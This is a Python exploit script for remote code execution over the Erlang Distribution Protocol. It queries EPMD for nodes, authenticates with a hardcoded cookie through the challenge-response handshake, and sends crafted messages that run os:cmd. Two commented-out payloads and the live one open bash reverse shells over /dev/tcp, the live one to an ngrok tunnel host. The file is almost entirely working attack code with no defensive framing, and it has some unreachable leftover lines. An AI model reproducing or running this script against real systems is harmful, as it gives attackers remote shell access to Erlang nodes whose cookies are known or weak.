import socket
from hashlib import md5
import struct
import sys
import re
import time




def ConnectEPMD(TARGET, EPMD_PORT):
        """
        Initial connection to target via epmd 
        """
        try:
            epm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            epm_socket.connect((TARGET, EPMD_PORT))
        except socket.error as msg:
            print("Failed to connect to EPMD: %s\n terminating program" % msg)
            sys.exit(1)
        return epm_socket

def GetErlangNodePort(epm_socket, MAGIC_BYTES):
    """
    Request for erland nodes, select target node and then enumerate its ERLANG PORT #
    """
    epm_socket.send(MAGIC_BYTES) # 3 magic bytes to request for erlang nodes
    if epm_socket.recv(4) == b'\x00\x00\x11\x11': # thats the 'ok 'bytes
        data = epm_socket.recv(2048)
        data = data[0:len(data) - 1].decode('ascii')
        data = data.split("\n")
        if len(data) == 1:
            choise = 1
            print("Found " + data[0])
        else:
            print("\nMore than one node found, choose one to continue:")
            line_number = 0
            for line in data:
                line_number += 1
                print(" %d) %s" %(line_number, line))
            choise = int(input("\n> "))
            
        ERLANG_NODE_PORT = int(re.search("\d+$",data[choise - 1])[0])
        print(ERLANG_NODE_PORT)
        return ERLANG_NODE_PORT
    else:
        print("Node list request error, exiting")
        sys.exit(1)
    epm_socket.close()

def NodeAuthentication(TARGET, ERLANG_NODE_PORT, NAME_MSG, COOKIE, CHALLENGE_REPLY):
    """
    connect to node & authenticate with cookie
    """
    #connect to node
    try:
        node_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(node_socket.connect((TARGET, ERLANG_NODE_PORT)))
    except socket.error as msg:
        print("Couldnt connect to Erlang server: %s\n terminating program" % msg)
        sys.exit(1)
    
    #send hello message to start authentication process
    node_socket.send(NAME_MSG)                              # Send 'hello' message 
    node_socket.recv(5)                                     # Receive "ok" message
    challenge = node_socket.recv(1024)                      # Receive "challenge" message
    challenge = struct.unpack(">I", challenge[9:13])[0]

    # Add Challenge Digest
    CHALLENGE_REPLY += md5(bytes(COOKIE, "ascii")
        + bytes(str(challenge), "ascii")).digest()

    node_socket.send(CHALLENGE_REPLY)                       # Send CHALLENGE REPLY to authenticate

    CHALLENGE_RESPONSE = node_socket.recv(1024)
    if len(CHALLENGE_RESPONSE) == 0:
        print("Authentication failed, exiting")
        sys.exit(1)

    print("Authentication successful")
    
    return node_socket
    
    ConnectEPMD(RHOST, EPMD_PORT, open_socket)
    ERLANG_NODE_PORT = GetErlangNodePort(open_socket)
    node_socket = NodeAuthentication(RHOST, ERLANG_NODE_PORT, CHALLENGE_REPLY)


def Main():
    """
    Main function
    """
    LHOST = "1"
    RHOST = '127.0.0.1'
    EPMD_PORT = 4369
    COOKIE = "$C0MPL3X_P@$$W0RD"
    ERLANG_NODE_PORT = 0
    MAGIC_BYTES = b"\x00\x01\x6e"
    NAME_MSG  = b"\x00\x1cn\x00\x05\x00\x07I\x9cZZZZZZZZZ@ZZZZZZZZZZZ"
    CHALLENGE_REPLY = b"\x00\x15r\x01\x02\x03\x04"

    print("RCE via Erlang Distribution Protocol.\n")

    while not LHOST:
        LHOST = input("Enter TARGET IP:\n")
    while not RHOST:
        RHOST = input("Enter ATTACKER IP:\n")
    if EPMD_PORT == 4369:
        print("Using default EPMD PORT 4369\n")
    else:
        EPMD_PORT = int(input("Enter EPMD PORT NUMBER (Defult 4369): \n"))

    epm_socket = ConnectEPMD(RHOST, EPMD_PORT)
    ERLANG_NODE_PORT = GetErlangNodePort(epm_socket, MAGIC_BYTES)
    node_socket = NodeAuthentication(RHOST, ERLANG_NODE_PORT, NAME_MSG, COOKIE, CHALLENGE_REPLY)

    #send reverse shell payload
    #payload  = b'\x00\x00\x00\xb1p\x83h\x04a\x06gd\x00\x15ZZZZZZZZZ@ZZZZZZZZZZZ\x00\x00\x00\x03\x00\x00\x00\x00\x00d\x00\x00d\x00\x03\rex\x83h\x02gd\x00\x15ZZZZZZZZZ@ZZZZZZZZZZZ\x00\x00\x00\x03\x00\x00\x00\x00\x00h\x05d\x00\x04calld\x00\x02osd\x00\x03cmdl\x00\x00\x00\x01k\x007/bin/bash -i 5<> /dev/tcp/127.0.0.1/4444 0<&5 1>&5 2>&5jd\x00\x04user'
    #payload2 = b"\x00\x00\x00\xbep\x83h\x04a\x06gd\x00\x15ZZZZZZZZZ@ZZZZZZZZZZZ\x00\x00\x00\x03\x00\x00\x00\x00\x00d\x00\x00d\x00\x03rex\x83h\x02gd\x00\x15ZZZZZZZZZ@ZZZZZZZZZZZ\x00\x00\x00\x03\x00\x00\x00\x00\x00h\x05d\x00\x04calld\x00\x02osd\x00\x03cmdl\x00\x00\x00\x01k\x00Dbash -c \'0<&80-;exec 80<>/dev/tcp/127.0.0.1/4444;sh <&80 >&80 2>&80\'jd\x00\x04user"
    ngrokpayload = b"\x00\x00\x00\xc7p\x83h\x04a\x06gd\x00\x15ZZZZZZZZZ@ZZZZZZZZZZZ\x00\x00\x00\x03\x00\x00\x00\x00\x00d\x00\x00d\x00\x03rex\x83h\x02gd\x00\x15ZZZZZZZZZ@ZZZZZZZZZZZ\x00\x00\x00\x03\x00\x00\x00\x00\x00h\x05d\x00\x04calld\x00\x02osd\x00\x03cmdl\x00\x00\x00\x01k\x00Mbash -c \'0<&33-;exec 33<>/dev/tcp/0.tcp.ap.ngrok.io/18560;sh <&33 >&33 2>&33\'jd\x00\x04user"
    print(ngrokpayload)
    node_socket.send(ngrokpayload)
if __name__ == "__main__":
    Main()
